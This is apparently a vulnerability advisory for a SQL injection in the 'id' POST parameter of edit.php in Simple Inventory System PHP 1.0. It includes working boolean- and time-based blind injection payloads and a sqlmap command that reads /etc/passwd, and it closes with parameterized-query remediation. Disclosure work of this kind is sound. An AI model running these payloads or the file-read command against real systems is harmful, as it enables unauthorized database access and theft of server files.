# SQL Injection in Simple Inventory System PHP 1.0 — /InventoryManagement/edit.php

## Affected Product Details

| Field | Details |
|-------|---------|
| **Product** | Simple Inventory System In PHP |
| **Version** | 1.0 |
| **Vendor** | https://code-projects.org/simple-inventory-system-in-php-with-source-code/ |
| **Vulnerable File** | `/InventoryManagement/edit.php` |
| **Vulnerable Parameter** | `id` (POST) |
| **Authentication Required** | No |
| **Attack Vector** | Remote |
| **Vulnerability Type** | Boolean-based Blind + Time-based Blind SQL Injection |
| **CWE** | CWE-89 |
| **CVSS v3.1 Score** | 7.5 (High) |
| **CVSS v3.1 Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

## Description

A SQL Injection vulnerability was found in Simple Inventory System 1.0 on code-projects.org. The affected file is `/InventoryManagement/edit.php`. The manipulation of the POST parameter `id` with a crafted payload leads to SQL Injection (Boolean-based Blind and Time-based Blind). The application directly concatenates user input into backend SQL queries without sanitization or parameterized queries. The attack can be initiated remotely without authentication. Arbitrary file read via FILE privilege was confirmed.

## Proof of Concept

**Vulnerable Request:**
```http
POST /InventoryManagement/edit.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

id=1&price=1&product_name=test&quantity=1&submit=Edit+Records
```

**Boolean-based Blind Payload:**
```
id=1' OR NOT 9058=9058-- -
```

**Time-based Blind Payload:**
```
id=1' AND (SELECT 5043 FROM (SELECT(SLEEP(5)))x)-- -
```

**Time-based Confirmation:**
```
sleep(0)  =>  0.003s
sleep(3)  =>  3.012s
sleep(5)  =>  5.008s
```

**Arbitrary File Read via FILE Privilege:**
```bash
sqlmap -r req.txt --random-agent --level 3 --risk 3 --batch \
--no-cast --file-read="/etc/passwd" --threads 10

# Result: /etc/passwd successfully retrieved
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Impact

An unauthenticated remote attacker can:
- Enumerate the entire backend database
- Extract user credentials and sensitive data
- Read arbitrary files from the server via FILE privilege
- Obtain internal database schema information

## Remediation

Use parameterized queries:

```php
$stmt = $conn->prepare("UPDATE products SET price=?, product_name=?, quantity=? WHERE id=?");
$stmt->bind_param("ssii", $price, $product_name, $quantity, $id);
$stmt->execute();
```

- Validate and sanitize all user input
- Restrict database user FILE privileges
- Implement least privilege principle for DB users

## References

- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/simple-inventory-system-in-php-with-source-code/
